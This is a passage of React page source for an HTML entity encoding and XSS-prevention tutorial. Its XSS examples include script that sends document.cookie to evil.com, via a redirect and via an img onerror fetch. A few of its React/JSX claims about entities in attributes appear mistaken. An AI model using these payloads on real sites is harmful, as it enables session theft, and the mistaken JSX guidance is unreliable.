              ['DOMPurify', 'DOMPurify.sanitize()', 'Full XSS sanitizer — strips dangerous tags/attributes, not just encoding'],
              ['escape-html', 'escapeHtml(str)', 'Minimal 5-character encoder for security — no decoding'],
              ['xss', 'xss(str)', 'Configurable whitelist-based XSS filter'],
            ].map(([lib, fn, notes], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontWeight: 700 }}>{lib}</td>
                <td style={monoTdStyle}>{fn}</td>
                <td style={{ ...tdStyle, fontSize: 13 }}>{notes}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <code style={blockCodeStyle}>{`// Using the 'he' library (npm install he)
import he from 'he';

he.encode('Tom & Jerry <fansite>');
// => 'Tom &amp; Jerry &lt;fansite&gt;'

he.encode('Caf\u00e9 ©', { useNamedReferences: true });
// => 'Caf&eacute; &copy;'

he.decode('&lt;p&gt;Hello &amp; World&lt;/p&gt;');
// => '<p>Hello & World</p>'

// Using 'escape-html' (minimal, security-focused)
import escapeHtml from 'escape-html';
escapeHtml('<script>alert(1)</script>');
// => '&lt;script&gt;alert(1)&lt;/script&gt;'`}</code>

      {/* ---- Section 7: Python ---- */}
      <h2 style={sectionHeadStyle}>HTML Entity Encoding in Python</h2>
      <p style={pStyle}>
        Python ships with robust HTML encoding utilities in its standard library, making third-party
        dependencies unnecessary for basic use cases.
      </p>

      <h3 style={subHeadStyle}>html.escape() and html.unescape()</h3>
      <code style={blockCodeStyle}>{`import html

# html.escape() — encodes the 5 HTML-special characters
html.escape('<script>alert("xss")</script>')
# => '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

html.escape('Tom & Jerry')
# => 'Tom &amp; Jerry'

# By default, quotes ARE encoded (quote=True is the default)
html.escape('"Hello World"')
# => '&quot;Hello World&quot;'

# Set quote=False to skip quote encoding (only safe for text content, not attributes!)
html.escape('"Hello"', quote=False)
# => '"Hello"'

# html.unescape() — decodes named and numeric entities
html.unescape('&lt;p&gt;Hello &amp; World&lt;/p&gt;')
# => '<p>Hello & World</p>'

html.unescape('Caf&eacute; &copy; 2025 &mdash; All rights reserved.')
# => 'Café © 2025 — All rights reserved.'

html.unescape('&#169; &#x20AC; &#9829;')
# => '© € ♥'`}</code>

      <h3 style={subHeadStyle}>Python HTML Entity Encoding in Web Frameworks</h3>
      <code style={blockCodeStyle}>{`# Django templates auto-escape by default
# {{ variable }} is HTML-escaped automatically
# Use {{ variable|safe }} only when you trust the content completely

from django.utils.html import escape, format_html, mark_safe

user_input = '<script>alert(1)</script>'
safe_html = escape(user_input)
# => '&lt;script&gt;alert(1)&lt;/script&gt;'

# format_html safely combines trusted HTML and escaped values
message = format_html('<p>Welcome, {}!</p>', user_input)
# => '<p>Welcome, &lt;script&gt;alert(1)&lt;/script&gt;!</p>'

# Flask/Jinja2 — auto-escapes in templates by default
from markupsafe import escape as jinja_escape, Markup

safe = jinja_escape('<b>Unsafe user input</b>')
print(safe)        # => &lt;b&gt;Unsafe user input&lt;/b&gt;
print(type(safe))  # => <class 'markupsafe.Markup'>

# Build safe HTML from trusted + untrusted parts
trusted_html = Markup('<p>Hello, {}!</p>').format('<script>xss</script>')
# => '<p>Hello, &lt;script&gt;xss&lt;/script&gt;!</p>'`}</code>

      <h3 style={subHeadStyle}>Encoding All Named Entities in Python</h3>
      <code style={blockCodeStyle}>{`# For full named entity encoding (e.g., © -> &copy;), use html.entities
from html.entities import codepoint2name

def encode_full_html(text: str, named: bool = True) -> str:
    """Encode all non-ASCII chars as named or numeric HTML entities."""
    result = []
    for char in html.escape(text):
        code = ord(char)
        if code > 127:
            name = codepoint2name.get(code)
            if named and name:
                result.append(f'&{name};')
            else:
                result.append(f'&#{code};')
        else:
            result.append(char)
    return ''.join(result)

encode_full_html('Café © 2025 — Cost: €49')
# => 'Caf&eacute; &copy; 2025 &mdash; Cost: &euro;49'

encode_full_html('Café © 2025', named=False)
# => 'Caf&#233; &#169; 2025'`}</code>

      {/* ---- Section 8: PHP ---- */}
      <h2 style={sectionHeadStyle}>HTML Entity Encoding in PHP</h2>
      <p style={pStyle}>
        PHP provides two main functions for HTML encoding, each with important differences that affect
        security and character coverage.
      </p>

      <h3 style={subHeadStyle}>htmlspecialchars() vs htmlentities()</h3>
      <code style={blockCodeStyle}>{`<?php

// htmlspecialchars() — encodes only the 5 HTML-special characters
// This is the RECOMMENDED function for XSS prevention
$user_input = '<script>alert("XSS")</script>';
echo htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
// => &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// Always pass ENT_QUOTES to encode both single and double quotes
// Always pass 'UTF-8' as the charset in PHP < 8.1 (default changed to UTF-8 in 8.1)

// htmlentities() — encodes ALL characters with HTML entity equivalents
// More aggressive than needed for UTF-8 documents; can cause issues
$text = 'Café © 2025 costs €49';
echo htmlentities($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
// => Caf&eacute; &copy; 2025 costs &euro;49

// htmlspecialchars_decode() — decodes back the 5 special chars only
$encoded = '&lt;b&gt;Hello &amp; World&lt;/b&gt;';
echo htmlspecialchars_decode($encoded, ENT_QUOTES);
// => <b>Hello & World</b>

// html_entity_decode() — decodes ALL HTML entities
$encoded = 'Caf&eacute; &copy; &euro;49';
echo html_entity_decode($encoded, ENT_QUOTES | ENT_HTML5, 'UTF-8');
// => Café © €49

// strip_tags() — removes HTML tags (NOT a security substitute for encoding!)
$input = '<script>alert(1)</script><b>Bold</b>';
echo strip_tags($input);
// => Bold  (the script is removed, bold tags stripped, but NEVER rely on this for security)

?>`}</code>

      <h3 style={subHeadStyle}>PHP Best Practices for HTML Encoding</h3>
      <div style={noteStyle}>
        <strong>PHP Security Rule:</strong> Always use{' '}
        <code>htmlspecialchars($var, ENT_QUOTES | ENT_HTML5, &apos;UTF-8&apos;)</code> when outputting
        user data in HTML. Do not rely on <code>strip_tags()</code> alone — it does not prevent XSS
        in attribute values or event handlers.
      </div>
      <code style={blockCodeStyle}>{`<?php
// Create a reusable helper function
function h(string $str): string {
    return htmlspecialchars($str, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// Usage in HTML templates
?>
<div class="user-profile">
    <h1><?= h($user['name']) ?></h1>
    <p class="bio"><?= h($user['bio']) ?></p>
    <a href="<?= h($user['website']) ?>">
        <?= h($user['website_label']) ?>
    </a>
    <input type="text" value="<?= h($user['email']) ?>"
           placeholder="<?= h($placeholder) ?>">
</div>

<?php
// In Twig templates (Symfony, Craft CMS)
// {{ variable }} — auto-escaped in Twig (same as h())
// {{ variable|raw }} — UNSAFE, skips escaping
// {{ variable|e('html') }} — explicit HTML escaping

// In Blade templates (Laravel)
// {{ $variable }} — auto-escaped
// {!! $variable !!} — UNSAFE raw output
?>`}</code>

      {/* ---- Section 9: Ruby ---- */}
      <h2 style={sectionHeadStyle}>HTML Entity Encoding in Ruby</h2>
      <p style={pStyle}>
        Ruby on Rails and the CGI module provide standard tools for HTML encoding. Rack-based frameworks
        use the Erubi template engine which auto-escapes by default.
      </p>
      <code style={blockCodeStyle}>{`# Ruby standard library: CGI module
require 'cgi'

CGI.escapeHTML('<script>alert("xss")</script>')
# => "&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;"

CGI.escapeHTML('Tom & Jerry')
# => "Tom &amp; Jerry"

CGI.unescapeHTML('&lt;b&gt;Hello&lt;/b&gt; &amp; World &copy;')
# => "<b>Hello</b> & World ©"

# Ruby on Rails — ERB templates
# <%= variable %> — HTML-escaped automatically (calls html_escape / h)
# <%== variable %> or <%= raw variable %> — UNSAFE raw output

# Using ERB programmatically
require 'erb'
include ERB::Util

html_escape('<script>alert(1)</script>')
# => "&lt;script&gt;alert(1)&lt;/script&gt;"

h('<script>alert(1)</script>')   # h() is an alias for html_escape
# => "&lt;script&gt;alert(1)&lt;/script&gt;"

# ActiveSupport (Rails) — content_tag for safe HTML generation
# content_tag(:p, user.name)           # auto-escaped
# content_tag(:p, user.name.html_safe) # UNSAFE — use only for trusted content

# Rack::Utils
require 'rack/utils'
Rack::Utils.escape_html('Tom & Jerry <3')
# => "Tom &amp; Jerry &lt;3"`}</code>

      {/* ---- Section 10: XSS Prevention ---- */}
      <h2 style={sectionHeadStyle}>XSS Prevention with HTML Entity Encoding</h2>
      <p style={pStyle}>
        <strong>Cross-Site Scripting (XSS)</strong> is one of the most prevalent web security
        vulnerabilities. It occurs when an attacker injects malicious scripts into web pages viewed
        by other users. HTML entity encoding is the primary defense, but it must be applied correctly
        and in the right context.
      </p>

      <h3 style={subHeadStyle}>Understanding XSS Attack Vectors</h3>
      <div style={dangerStyle}>
        <strong>XSS Attack Types:</strong>
        <ul style={{ marginTop: 10, marginBottom: 0, paddingLeft: 20 }}>
          <li><strong>Reflected XSS:</strong> Malicious script in the URL is reflected back in the response.</li>
          <li><strong>Stored XSS:</strong> Malicious script stored in the database, served to all visitors.</li>
          <li><strong>DOM-based XSS:</strong> Script injected via client-side DOM manipulation without server involvement.</li>
        </ul>
      </div>

      <code style={blockCodeStyle}>{`<!-- Reflected XSS Example -->
<!-- URL: https://example.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script> -->

<!-- VULNERABLE server response -->
<p>Results for: <script>document.location='https://evil.com?c='+document.cookie</script></p>

<!-- SAFE server response (after HTML encoding the query parameter) -->
<p>Results for: &lt;script&gt;document.location=&#39;https://evil.com?c=&#39;+document.cookie&lt;/script&gt;</p>

<!-- Stored XSS Example — comment stored in database -->
<!-- Attacker comment: <img src=x onerror="fetch('https://evil.com?'+document.cookie)"> -->

<!-- VULNERABLE — displaying raw stored content -->
<div class="comment">[raw comment HTML here]</div>

<!-- SAFE — HTML-encode before rendering -->
<div class="comment">&lt;img src=x onerror=&quot;fetch(&#39;https://evil.com?&#39;+document.cookie)&quot;&gt;</div>`}</code>

      <h3 style={subHeadStyle}>Context-Sensitive Escaping — Why One Encoder Is Not Enough</h3>
      <p style={pStyle}>
        A critical and often misunderstood principle: HTML entity encoding alone is not sufficient
        for all injection contexts. Different parts of an HTML document require different escaping
        strategies:
      </p>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Context</th>
              <th style={thStyle}>Required Escaping</th>
              <th style={thStyle}>Example</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['HTML body text', 'HTML entity encode', '<p>{user_input}</p>'],
              ['HTML attribute value', 'HTML entity encode + quote attribute', '<input value="{user_input}">'],
              ['JavaScript string in script tag', 'JavaScript string escape (\\\\, \\", \\n, etc.)', '<script>var x = "{user_input}";</script>'],
              ['CSS value in style tag', 'CSS escape', '<style>color: {user_input};</style>'],
              ['URL in href/src', 'URL encode, then HTML encode', '<a href="{url_encoded_then_html_encoded}">'],
              ['JSON in HTML', 'JSON encode + avoid </script>', '<script>var data = {json_encoded};</script>'],
            ].map(([ctx, esc, ex], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontWeight: 600, fontSize: 13 }}>{ctx}</td>
                <td style={{ ...tdStyle, fontSize: 13 }}>{esc}</td>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 12, color: '#4b5563' }}>{ex}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <code style={blockCodeStyle}>{`// JavaScript context inside <script> tags requires JS string escaping, NOT HTML entities
// WRONG — HTML encoding in a JS context
const name = '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;';
// The browser HTML-decodes before parsing JS, making the injection work!

// CORRECT — JSON encode for JavaScript embedding
// In a server template (e.g., Node.js with Handlebars):
const userData = JSON.stringify({ name: userName })
  .replace(/<\/script>/gi, '<\\/script>');  // prevents premature </script> closing

// Better: use a dedicated JSON-in-HTML serializer
// e.g., json-stringify-safe, or serialize-javascript (npm package)
import serialize from 'serialize-javascript';
const userDataStr = serialize({ name: userName }, { isJSON: true });

// CSS injection is also real — never embed user input in CSS without escaping
// WRONG:
// <div style="background-image: url({userUrl});">
// An attacker can use: ); expression(alert(1)); background:(

// SAFE: Never allow user input in CSS values; use whitelisting or data attributes instead`}</code>

      <h3 style={subHeadStyle}>Content Security Policy as Defense in Depth</h3>
      <p style={pStyle}>
        HTML encoding neutralizes most XSS, but a Content Security Policy (CSP) header provides
        a second layer of defense that limits what scripts can execute even if encoding fails:
      </p>
      <code style={blockCodeStyle}>{`# HTTP Response Header — strict CSP
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-{random-nonce-per-request}';
  style-src 'self' 'nonce-{random-nonce-per-request}';
  img-src 'self' data: https:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';

# With nonces, only scripts with the matching nonce attribute execute:
<script nonce="rAnd0mNonce123">
  // This script is allowed by CSP
</script>

# Any injected <script> without the nonce is blocked by the browser`}</code>

      <div style={successStyle}>
        <strong>Defense-in-depth approach:</strong>
        <ol style={{ marginTop: 10, marginBottom: 0, paddingLeft: 20 }}>
          <li>HTML entity encode all user-supplied data in HTML contexts (primary defense).</li>
          <li>Use context-appropriate escaping (JS, CSS, URL) in other contexts.</li>
          <li>Implement Content Security Policy headers (secondary defense).</li>
          <li>Use HTTP-only cookies to limit cookie theft even if XSS occurs.</li>
          <li>Use a well-tested sanitization library (like DOMPurify) for rich text user input.</li>
        </ol>
      </div>

      {/* ---- Section 11: HTML Entities in React/JSX ---- */}
      <h2 style={sectionHeadStyle}>HTML Entities in React / JSX</h2>
      <p style={pStyle}>
        React automatically HTML-encodes all string values rendered via JSX expressions. This means
        you rarely need to manually encode entities in React applications. However, there are specific
        patterns for using HTML entities in JSX.
      </p>

      <h3 style={subHeadStyle}>React Auto-Escaping</h3>
      <code style={blockCodeStyle}>{`// React auto-escapes all JSX expressions
const userInput = '<script>alert("xss")</script>';
const Comment = () => <p>{userInput}</p>;
// Renders as: <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>
// Browser displays: <script>alert("xss")</script> (as text, not code)

// dangerouslySetInnerHTML bypasses auto-escaping — use with extreme caution
const TrustedHtml = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: html }} />
);
// Only use when html is sanitized by DOMPurify or similar`}</code>

      <h3 style={subHeadStyle}>Using HTML Entities in JSX Source Code</h3>
      <code style={blockCodeStyle}>{`// In JSX string content, use HTML entity names or numeric codes
// Option 1: HTML entity name (inside JSX expressions {})
const Pricing = () => (
  <p>Price: &euro;49 &mdash; &copy; 2025</p>
);
// But &euro;, &mdash;, &copy; are resolved at HTML parsing level by the browser,
// not by React/JSX. This works because JSX compiles to HTML.

// Option 2: Unicode escape in JS string
const Pricing2 = () => (
  <p>Price: {'\u20AC'}49 {'\u2014'} {'\u00A9'} 2025</p>
);

// Option 3: Literal Unicode characters in JSX (requires UTF-8 source file)
const Pricing3 = () => (
  <p>Price: €49 — © 2025</p>
);
// This is the cleanest approach for UTF-8 React projects

// Option 4: HTML entity codes in JSX text (NOT in expressions)
// These must be inside JSX text, not inside {}
const Arrow = () => <span>&rarr;</span>;   // renders →
const Copyright = () => <span>&copy;</span>; // renders ©

// Common JSX entity pitfall — apostrophes in text
// WRONG — JSX parser error
// const Bad = () => <p>You're welcome</p>;  // will cause linter warning

// CORRECT options:
const Good1 = () => <p>{"You're welcome"}</p>;  // string expression
const Good2 = () => <p>You&apos;re welcome</p>; // named entity
const Good3 = () => <p>You&#39;re welcome</p>;  // numeric entity
const Good4 = () => <p>You{"\u2019"}re welcome</p>; // Unicode curly apostrophe`}</code>

      <h3 style={subHeadStyle}>HTML Entities in JSX Attribute Values</h3>
      <code style={blockCodeStyle}>{`// JSX attribute values are JavaScript expressions — use Unicode or strings
// NOT HTML entities in attribute values (React doesn't parse entities in attributes)

// WRONG — HTML entities in JSX attribute values are literal strings
const BadTitle = () => <div title="Tom &amp; Jerry">...</div>;
// The title will be "Tom &amp; Jerry" literally, not "Tom & Jerry"!

// CORRECT — use literal characters or Unicode in JSX attribute values
const GoodTitle1 = () => <div title="Tom & Jerry">...</div>;   // literal &
const GoodTitle2 = () => <div title={"Tom & Jerry"}>...</div>; // JS string

// For aria labels and similar attributes
const Icon = () => (
  <button aria-label="Copy to clipboard &rarr;">  {/* WRONG */}
    Copy
  </button>
);

const IconFixed = () => (
  <button aria-label="Copy to clipboard \u2192">  {/* CORRECT */}
    Copy
  </button>
);`}</code>

      {/* ---- Section 12: HTML Entities in Different Contexts ---- */}
      <h2 style={sectionHeadStyle}>HTML Entities in Email, XML, and Other Contexts</h2>

      <h3 style={subHeadStyle}>HTML Entities in Email Templates</h3>
      <p style={pStyle}>
        HTML email has inconsistent and often outdated rendering engines. Entity encoding is critical
        for email compatibility because many email clients use older HTML parsing engines.
      </p>
      <code style={blockCodeStyle}>{`<!-- HTML Email Best Practices for Entities -->

<!-- Always encode &, <, >, " in email HTML content -->
<p>Tom &amp; Jerry Newsletter &mdash; Issue #42</p>

<!-- Use numeric entities for special characters in email -->
<!-- Named entities like &mdash; &lsquo; &rsquo; may not be supported in all clients -->
<p>Tom &amp; Jerry Newsletter &#8212; Issue #42</p>  <!-- safer -->

<!-- Non-breaking spaces are widely supported -->
<td>100&nbsp;items</td>

<!-- Emoji in email: use UTF-8 encoding + declare in <head> -->
<!-- Some clients strip emoji; use text fallbacks -->
<p>&#127881; Happy New Year! (🎉 if supported)</p>

<!-- Copyright in email footer -->
<p>&copy; 2025 Company Name. All rights reserved.</p>
<p>&#169; 2025 Company Name. All rights reserved.</p>  <!-- numeric fallback -->`}</code>

      <h3 style={subHeadStyle}>HTML Entities in XML and SVG</h3>
      <p style={pStyle}>
        XML is stricter than HTML. XHTML (HTML served as XML) only supports five predefined entities
        by default. SVG documents embedded in HTML follow HTML entity rules; SVG as standalone XML
        follows XML rules.
      </p>
      <code style={blockCodeStyle}>{`<!-- XML predefined entities (the only 5 built-in XML entities) -->
&amp;   <!-- & -->
&lt;    <!-- < -->
&gt;    <!-- > -->
&quot;  <!-- " -->
&apos;  <!-- ' -->

<!-- In XML, other named entities like &copy; &mdash; are NOT defined! -->
<!-- You must use numeric entities or declare them in the DOCTYPE -->
<?xml version="1.0" encoding="UTF-8"?>
<document>
  <text>Copyright &#169; 2025 &#8212; All rights reserved.</text>
  <formula>x &#60; y &#38;&#38; y &#62; 0</formula>
</document>

<!-- SVG text in HTML — HTML entity rules apply -->
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="10" y="30">Tom &amp; Jerry &rarr;</text>
</svg>

<!-- SVG as standalone XML file — XML rules apply -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>Tom &amp; Jerry &#8594;</text>  <!-- &rarr; not valid in XML! -->
</svg>`}</code>

      <h3 style={subHeadStyle}>HTML Entities in CSS content Property</h3>
      <code style={blockCodeStyle}>{`/* CSS content property — does NOT understand HTML entities */

/* WRONG — HTML entities do not work in CSS */
.icon::before {
  content: '&rarr;';  /* Renders literally as "&rarr;" — NOT an arrow! */
}

/* CORRECT — use Unicode escape sequences in CSS */
.icon::before {
  content: '\\2192';  /* Unicode escape for → (U+2192) */
}

.copyright::after {
  content: '\\00A9';  /* © copyright symbol */
}

.dash::before {
  content: '\\2014 ';  /* em dash — */
}

/* Or embed the actual Unicode character directly */
.check::before {
  content: '✓';  /* Direct Unicode character — works in UTF-8 CSS files */
}

/* Common Unicode values for CSS content */
/* \\201C = " left double quote    */
/* \\201D = " right double quote   */
/* \\2018 = ' left single quote    */
/* \\2019 = ' right single quote   */
/* \\2026 = … ellipsis             */
/* \\00AB = « left guillemet       */
/* \\00BB = » right guillemet      */`}</code>

      {/* ---- Section 13: HTML Special Characters Categories ---- */}
      <h2 style={sectionHeadStyle}>Complete HTML Special Characters by Category</h2>

      <h3 style={subHeadStyle}>Punctuation and Typography</h3>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Character</th>
              <th style={thStyle}>Named</th>
              <th style={thStyle}>Numeric</th>
              <th style={thStyle}>Use case</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['\u2018', '&lsquo;', '&#8216;', "Left single quotation mark — 'quoted'"],
              ['\u2019', '&rsquo;', '&#8217;', "Right single quotation mark / apostrophe — it's"],
              ['\u201c', '&ldquo;', '&#8220;', '"Left double quotation mark — "quoted"'],
              ['\u201d', '&rdquo;', '&#8221;', '"Right double quotation mark — "quoted"'],
              ['\u2026', '&hellip;', '&#8230;', 'Horizontal ellipsis — continued...'],
              ['\u2013', '&ndash;', '&#8211;', 'En dash — used in ranges (2010\u20132020)'],
              ['\u2014', '&mdash;', '&#8212;', 'Em dash — sentence break or parenthetical'],
              ['\u00ab', '&laquo;', '&#171;', '\u00abFrench-style left guillemet\u00bb'],
              ['\u00bb', '&raquo;', '&#187;', '\u00abFrench-style right guillemet\u00bb'],
              ['\u00b7', '&middot;', '&#183;', 'Middle dot \u00b7 interpunct'],
              ['\u2022', '&bull;', '&#8226;', 'Bullet point \u2022'],
              ['\u00a7', '&sect;', '&#167;', 'Section sign \u00a7 (legal documents)'],
              ['\u00b6', '&para;', '&#182;', 'Pilcrow / paragraph sign \u00b6'],
              ['\u2020', '&dagger;', '&#8224;', 'Dagger \u2020 (footnote marker)'],
              ['\u2021', '&Dagger;', '&#8225;', 'Double dagger \u2021 (footnote marker)'],
            ].map(([char, named, numeric, desc], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 18, textAlign: 'center' }}>{char}</td>
                <td style={monoTdStyle}>{named}</td>
                <td style={monoTdStyle}>{numeric}</td>
                <td style={{ ...tdStyle, fontSize: 13 }}>{desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <h3 style={subHeadStyle}>Mathematical Symbols</h3>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Symbol</th>
              <th style={thStyle}>Named</th>
              <th style={thStyle}>Numeric</th>
              <th style={thStyle}>Description</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['\u00b1', '&plusmn;', '&#177;', 'Plus-minus \u00b1'],
              ['\u00d7', '&times;', '&#215;', 'Multiplication \u00d7'],
              ['\u00f7', '&divide;', '&#247;', 'Division \u00f7'],
              ['\u2248', '&asymp;', '&#8776;', 'Approximately equal \u2248'],
              ['\u2260', '&ne;', '&#8800;', 'Not equal \u2260'],
              ['\u2264', '&le;', '&#8804;', 'Less-than or equal \u2264'],
              ['\u2265', '&ge;', '&#8805;', 'Greater-than or equal \u2265'],
              ['\u221e', '&infin;', '&#8734;', 'Infinity \u221e'],
              ['\u221a', '&radic;', '&#8730;', 'Square root \u221a'],
              ['\u2211', '&sum;', '&#8721;', 'Summation \u2211'],
              ['\u220f', '&prod;', '&#8719;', 'Product \u220f'],
              ['\u222b', '&int;', '&#8747;', 'Integral \u222b'],
              ['\u2205', '&empty;', '&#8709;', 'Empty set \u2205'],
              ['\u2208', '&isin;', '&#8712;', 'Element of \u2208'],
              ['\u2209', '&notin;', '&#8713;', 'Not element of \u2209'],
              ['\u2229', '&cap;', '&#8745;', 'Intersection \u2229'],
              ['\u222a', '&cup;', '&#8746;', 'Union \u222a'],
              ['\u2282', '&sub;', '&#8834;', 'Subset of \u2282'],
              ['\u2283', '&sup;', '&#8835;', 'Superset of \u2283'],
              ['\u00b2', '&sup2;', '&#178;', 'Superscript 2 (squared) \u00b2'],
              ['\u00b3', '&sup3;', '&#179;', 'Superscript 3 (cubed) \u00b3'],
              ['\u00bc', '&frac14;', '&#188;', 'Vulgar fraction one quarter \u00bc'],
              ['\u00bd', '&frac12;', '&#189;', 'Vulgar fraction one half \u00bd'],
              ['\u00be', '&frac34;', '&#190;', 'Vulgar fraction three quarters \u00be'],
            ].map(([char, named, numeric, desc], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 18, textAlign: 'center' }}>{char}</td>
                <td style={monoTdStyle}>{named}</td>
                <td style={monoTdStyle}>{numeric}</td>
                <td style={{ ...tdStyle, fontSize: 13 }}>{desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <h3 style={subHeadStyle}>Arrows</h3>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Arrow</th>
              <th style={thStyle}>Named</th>
              <th style={thStyle}>Numeric</th>
              <th style={thStyle}>Description</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['\u2190', '&larr;', '&#8592;', 'Leftwards arrow'],
              ['\u2192', '&rarr;', '&#8594;', 'Rightwards arrow'],
              ['\u2191', '&uarr;', '&#8593;', 'Upwards arrow'],
              ['\u2193', '&darr;', '&#8595;', 'Downwards arrow'],
              ['\u2194', '&harr;', '&#8596;', 'Left right arrow'],
              ['\u21d0', '&lArr;', '&#8656;', 'Leftwards double arrow'],
              ['\u21d2', '&rArr;', '&#8658;', 'Rightwards double arrow'],
              ['\u21d4', '&hArr;', '&#8660;', 'Left right double arrow'],
              ['\u21b5', '&crarr;', '&#8629;', 'Downwards arrow with corner leftwards (carriage return)'],
            ].map(([char, named, numeric, desc], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 18, textAlign: 'center' }}>{char}</td>
                <td style={monoTdStyle}>{named}</td>
                <td style={monoTdStyle}>{numeric}</td>
                <td style={{ ...tdStyle, fontSize: 13 }}>{desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ---- Section 14: Common Mistakes ---- */}
      <h2 style={sectionHeadStyle}>Common HTML Entity Mistakes and How to Fix Them</h2>

      <h3 style={subHeadStyle}>Mistake 1: Forgetting to Encode Ampersands in URLs</h3>
      <code style={blockCodeStyle}>{`<!-- WRONG — the & breaks HTML validation and may confuse parsers -->
<a href="https://example.com/api?foo=1&bar=2&baz=3">API Call</a>

<!-- CORRECT — encode & as &amp; in HTML attribute values -->
<a href="https://example.com/api?foo=1&amp;bar=2&amp;baz=3">API Call</a>

<!-- Also wrong in meta refresh -->
<meta http-equiv="refresh" content="0; url=https://example.com?a=1&b=2">
<!-- CORRECT -->
<meta http-equiv="refresh" content="0; url=https://example.com?a=1&amp;b=2">`}</code>

      <h3 style={subHeadStyle}>Mistake 2: Double Encoding</h3>
      <code style={blockCodeStyle}>{`<!-- Double encoding happens when already-encoded text is encoded again -->

<!-- Original text: Tom & Jerry -->
<!-- After first encode: Tom &amp; Jerry -->
<!-- After second encode: Tom &amp;amp; Jerry  <-- WRONG, shows literally -->

<!-- This often happens in templating chains where multiple layers encode the same variable -->

<!-- Fix: ensure encoding happens exactly once per output context -->

// JavaScript double encoding prevention
function safeEncode(str) {
  // First decode any existing entities to avoid double encoding
  const decoded = new DOMParser()
    .parseFromString(str, 'text/html')
    .documentElement.textContent;
  // Then encode once
  return encodeHtml(decoded);
}

// Python double encoding prevention
import html
def safe_encode(text):
    # Decode first if the text might already be encoded
    decoded = html.unescape(text)
    # Then encode once
    return html.escape(decoded)`}</code>

      <h3 style={subHeadStyle}>Mistake 3: Using HTML Entities in CSS content Values</h3>
      <code style={blockCodeStyle}>{`/* WRONG — HTML entities in CSS are treated as literal text */
.arrow::before { content: '&rarr;'; }  /* Shows: &rarr; */
.copy::after  { content: '&copy;'; }   /* Shows: &copy; */

/* CORRECT — use CSS Unicode escapes */
.arrow::before { content: '\\2192'; }   /* Shows: → */
.copy::after  { content: '\\00A9'; }   /* Shows: © */

/* Or embed actual characters directly (UTF-8 CSS file) */
.arrow::before { content: '→'; }
.copy::after  { content: '©'; }`}</code>

      <h3 style={subHeadStyle}>Mistake 4: Not Encoding in JavaScript Contexts</h3>
      <code style={blockCodeStyle}>{`// HTML entities are NOT interpreted inside <script> tags
// WRONG approach — thinking HTML encoding protects JS contexts

// If a server template outputs:
// <script>var name = "&lt;script&gt;alert(1)&lt;/script&gt;";</script>
// The browser parses the JS string as the literal characters &lt;script&gt;...
// which is still a string (not injected), but this approach is fragile.

// The CORRECT approach: JSON-encode for JS contexts
// <script>var name = <%= JSON.stringify(userInput) %>;</script>
// => <script>var name = "<script>alert(1)<\/script>";</script>
// The JSON-encoded string properly escapes the content for JS

// Node.js example (Express + EJS)
app.get('/profile', (req, res) => {
  res.render('profile', {
    // Pass raw data to template
    userName: req.user.name,
    // In EJS: <%= JSON.stringify(userName) %> for JS contexts
    // In EJS: <%- escapeXml(userName) %> for HTML contexts (auto-escaped with <%=)
  });
});`}</code>

      <h3 style={subHeadStyle}>Mistake 5: Using &amp;nbsp; for Visual Spacing</h3>
      <code style={blockCodeStyle}>{`<!-- WRONG — using &nbsp; for visual indentation or spacing -->
<p>&nbsp;&nbsp;&nbsp;Indented text</p>
<p>First line<br>&nbsp;&nbsp;Second indented line</p>
<td>&nbsp;&nbsp;&nbsp;Cell content</td>

<!-- This is fragile, semantic nonsense, and accessibility nightmare -->

<!-- CORRECT — use CSS for visual spacing -->
<p style="text-indent: 2em;">Indented text</p>
<p style="padding-left: 2em;">Second indented</p>
<td style="padding-left: 1.5rem;">Cell content</td>

<!-- &nbsp; has legitimate uses: -->
<!-- 1. Prevent line break between related words -->
<span>Dr.&nbsp;Smith</span>      <!-- name won't wrap between title and name -->
